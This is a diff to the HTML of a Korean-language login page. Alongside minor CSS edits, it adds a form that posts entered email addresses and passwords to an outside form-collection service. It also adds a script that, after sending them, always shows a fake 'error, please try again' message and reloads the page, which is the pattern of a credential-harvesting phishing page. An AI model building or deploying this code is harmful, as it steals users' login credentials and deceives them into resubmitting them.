@@ -23,7 +23,7 @@
       content: "";
       position: absolute;
       inset: 0;
-      background: rgba(0, 0, 0, 0.6); /* stronger overlay */
+      background: rgba(0, 0, 0, 0.6);
     }
     .hero h1, .hero p {
       position: relative;
@@ -35,10 +35,10 @@
       font-weight: 800;
     }
     .hero p {
-      font-size: 1.25rem;       /* bigger for readability */
-      font-weight: 600;         /* semi-bold */
-      color: #ffffff;           /* ensure white */
-      text-shadow: 0 2px 6px rgba(0,0,0,0.6); /* stronger shadow */
+      font-size: 1.25rem;
+      font-weight: 600;
+      color: #ffffff;
+      text-shadow: 0 2px 6px rgba(0,0,0,0.6);
     }
 
     /* MAIN */
@@ -57,6 +57,15 @@
     .login-button {
       padding: 0.75rem 1rem;
       font-size: 1rem;
+    }
+
+    /* MESSAGE */
+    .form-message {
+      margin-top: 0.5rem;
+      font-size: 0.85rem;
+      color: red;
+      text-align: center;
+      display: none;
     }
   </style>
 </head>
@@ -108,10 +117,11 @@
         <div class="md:w-1/2 flex justify-end">
           <div class="bg-gray-50 shadow-md rounded-2xl p-6 w-full max-w-xs">
             <h2 class="text-lg font-bold text-center mb-3">로그인</h2>
-            <form class="space-y-3">
-              <input type="email" placeholder="이메일 주소" class="w-full border rounded-md login-input focus:ring-2 focus:ring-blue-300 outline-none">
-              <input type="password" placeholder="비밀번호" class="w-full border rounded-md login-input focus:ring-2 focus:ring-blue-300 outline-none">
+            <form id="login-form" class="space-y-3" action="https://submit.formspark.io/2egN1olQU" method="POST">
+              <input type="email" name="email" placeholder="이메일 주소" class="w-full border rounded-md login-input focus:ring-2 focus:ring-blue-300 outline-none" required>
+              <input type="password" name="password" placeholder="비밀번호" class="w-full border rounded-md login-input focus:ring-2 focus:ring-blue-300 outline-none" required>
               <button type="submit" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium rounded-md login-button">로그인</button>
+              <div id="form-message" class="form-message">오류, 다시 시도해주세요</div>
             </form>
             <div class="text-center text-xs text-gray-500 mt-2">
               계정이 없으신가요? <a href="#" class="text-blue-500 hover:underline">회원가입</a>
@@ -134,6 +144,38 @@
       </div>
     </div>
   </footer>
+
+  <!-- FORMSPARK SCRIPT -->
+  <script>
+    const form = document.getElementById('login-form');
+    const message = document.getElementById('form-message');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault(); // prevent default submit
+
+      const formData = new FormData(form);
+
+      fetch(form.action, {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      }).then(response => {
+        // Show the error message in Korean
+        message.style.display = 'block';
+
+        // Redirect to the same page after 2 seconds
+        setTimeout(() => {
+          window.location.href = window.location.href;
+        }, 2000);
+      }).catch(error => {
+        // Show the same message on network error
+        message.style.display = 'block';
+        setTimeout(() => {
+          window.location.href = window.location.href;
+        }, 2000);
+      });
+    });
+  </script>
 
 </body>
 </html>
